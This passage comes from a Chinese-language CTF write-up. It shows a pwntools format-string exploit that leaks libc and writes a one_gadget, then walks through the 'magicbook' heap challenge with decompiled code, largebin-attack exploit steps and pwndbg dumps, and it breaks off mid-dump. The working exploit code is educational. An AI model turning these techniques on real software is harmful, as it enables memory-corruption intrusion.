punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>aaaaaaaa-0x601089-0x40-0x7ffff78f7360-0x7ffff7ff7700-0x13-0x7fffffffddc0-(nil)-0x400840-0x7ffff7820840</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>00:0000│  0x7fffffffddc0 —▸ 0x7fffffffe2b7 ◂— 'SSH_AUTH_SOCK=/run/user/1000/keyring/ssh'</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>00:0000│  0x7ffff7820840 (__libc_start_main+240) ◂— 0x31000197f9e8c789</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\">#  ► 0x7ffff784ffa1    call   qword ptr [rax + 0x38]        &lt;_IO_file_xsputn></span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token comment\">#  ► 0x7ffff7879397 &lt;_IO_file_xsputn+423>    call   qword ptr [rax + 0x78]        &lt;_IO_file_write></span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token comment\"># b * 0x400825</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'%6$p-%9$p'</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please enter a keyword\\n'</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"0x\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>stack <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#0x7fffffffddc0 - 0x7fffffffdce8</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"-0x\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>libcbase <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">240</span> <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>system <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"65\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'stack'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'libcbase'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>stack1 <span class=\"token operator\">=</span> stack <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x7fffffffddc0</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x7fffffffdce8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"stack1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>ogg <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x4527a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xf03a4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xf1247</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>og <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> ogg<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'og'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>debug<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Please enter a keyword\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'%'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>stack1<span class=\"token operator\">&amp;</span><span class=\"token number\">0xffff</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'c%11$hn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>input1 <span class=\"token operator\">=</span> stack1<span class=\"token operator\">&amp;</span><span class=\"token number\">0xffff</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>input2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>stack1<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0xffff</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token comment\"># [+] input1 ：0xdce8</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token comment\"># [+] input2 ：0xdcea</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Please enter a keyword\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'%'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>og<span class=\"token operator\">&amp;</span><span class=\"token number\">0xffff</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'c%37$hn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Please enter a keyword\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'%'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack1<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0xffff</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'c%11$hn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Please enter a keyword\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'%'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>og<span class=\"token operator\">>></span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'c%37$hhn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"magicbook\"><a class=\"markdownIt-Anchor\" href=\"#magicbook\">#</a> magicbook</h3>\n<blockquote>\n<p>考察 largebin_attack，orw</p>\n</blockquote>\n<pre><code>Arch: amd64-64-little\nRELRO: Full RELRO\nStack: No canary found\nNX: NX enabled\nPIE: PIE enabled\n该程序是动态连接的\n该程序有符号表可用\n</code></pre>\n<blockquote>\n<p>先申代码</p>\n</blockquote>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>__int64 <span class=\"token function\">sandbox</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  __int64 v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token function\">seccomp_init</span><span class=\"token punctuation\">(</span><span class=\"token number\">2147418112LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">59LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">seccomp_load</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>沙箱比较简单</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">return</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"give you a gift: %p\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>给了 elf 中的 d 的真实地址，从而绕过 pie</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>book <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int16<span class=\"token punctuation\">)</span>book<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>book 类型转换，为啥这样呢？往后看就明白了</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token function\">edit_the_book</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token class-name\">size_t</span> v0<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-20h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"come on,Write down your story!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> book<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  v0 <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> v0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里往栈上读数据。而长度为 book。但这里我们暂时未知 book 如何怎样一种形式作为长度</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">size_t</span> <span class=\"token function\">creat_the_book</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token class-name\">size_t</span> v0<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rbx</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token class-name\">size_t</span> size<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-14h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> book <span class=\"token operator\">></span> <span class=\"token number\">5</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"full!!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"the book index is %d\\n\"</span><span class=\"token punctuation\">,</span> book<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"How many pages does your book need?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function\">LODWORD</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%u\"</span><span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">LODWORD</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0x500</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"wrong!!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  v0 <span class=\"token operator\">=</span> book<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  p<span class=\"token punctuation\">[</span>v0<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token function\">LODWORD</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token operator\">++</span>book<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>在这里给出了 book 以 <code>0&lt;count&lt;5</code>  作为长度从 edit 读到栈上，并且 malloc 最大的 size 为 0x500，可以释放进 largebin 内。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>__int64 <span class=\"token function\">delete_the_book</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-10h] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> v2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-Ch] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-8h] BYREF</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"which book would you want to delete?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">// 判断数量</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>p <span class=\"token operator\">+</span> v2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Do you want to say anything else before being deleted?(y/n)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">4uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> d <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">89</span> <span class=\"token operator\">||</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">121</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"which page do you want to write?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%u\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v1 <span class=\"token operator\">></span> <span class=\"token number\">4</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>p <span class=\"token operator\">+</span> v2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"wrong!!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"content: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>p <span class=\"token operator\">+</span> v1<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">8LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token operator\">--</span>d<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">// 无所谓</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>很明显的 uaf，且从 userdata [1] 开始写，所以释放之后你可以直接去修改 fdnextsize 或 bknextsize。算是人性化的题目</p>\n<blockquote>\n<p>好了。代码整体分析了一遍了。如何去攻打捏</p>\n<p>大家可能都被 heap 的第一想法给耽误了如何去做这个题，house？如何泄露 libc？</p>\n<p>其实有时候不要光去用 house 去打 heap，这题用到为 largebin attack 修改 size</p>\n</blockquote>\n<blockquote>\n<p>为了题目为何这样打，先去了解一下 large bin 的性质。</p>\n</blockquote>\n<p>large bin 是一个双向链表，不同之前的 small bin 和 unsorted bin，它多了 fd_nextsize 和 bk_nextsize</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x450</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0 chunk0</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#1 chunk1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x440</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#2 chunk2</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\">#  chunk0 進入 unsortedbin</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0 chunk3 chunk1 進入 largebin    </span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>book <span class=\"token operator\">=</span> elfbase <span class=\"token operator\">+</span> <span class=\"token number\">0x4050</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>book <span class=\"token operator\">-</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 釋放 chunk2, 進入 unsortedbin 內，同時 uaf 修改 chunk0 的 bk 指針，指向目的地址</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># &lt;large bin attack>,chunk2 插入 largebin 內，同時覆蓋地址 chunk1->bknextsize->fdnextsize 指向 chunk2</span></pre></td></tr></table></figure><p>上面就是 largebin 具体攻击，通过修改 fdnextsize，将 name 修改的特别大</p>\n<blockquote>\n<p>before large bin attack</p>\n<p>pwndbg&gt; x/20gx 0x555555558050-0x20<br>\n0x555555558030 &lt;stdin@@GLIBC_2.2.5&gt;:\t0x00007ffff7e1aaa0\t0x0000000000000000<br>\n0x555555558040 &lt;stderr@@GLIBC_2.2.5&gt;:\t0x00007ffff7e1b6a0\t0x0000000000000000<br>\n0x555555558050 <book>:\t0x0000000000000004\t0x0000000000000000<br>\n0x555555558060 <p>:\t0x000055555555d0c0\t0x000055555555d5a0<br>\n0x555555558070 &lt;p+16&gt;:\t0x000055555555d5e0\t0x000055555555daa0<br>\n0x555555558080 &lt;p+32&gt;:\t0x0000000000000000\t0x000055555555cfb0<br>\n0x555555558090 &lt;p+48&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x5555555580a0 &lt;p+64&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x5555555580b0 &lt;p+80&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x5555555580c0 &lt;p+96&gt;:\t0x0000000000000000\t0x0000000000000000</p>\n<p>atfte  large bin attack</p>\n<p>0x555555558030 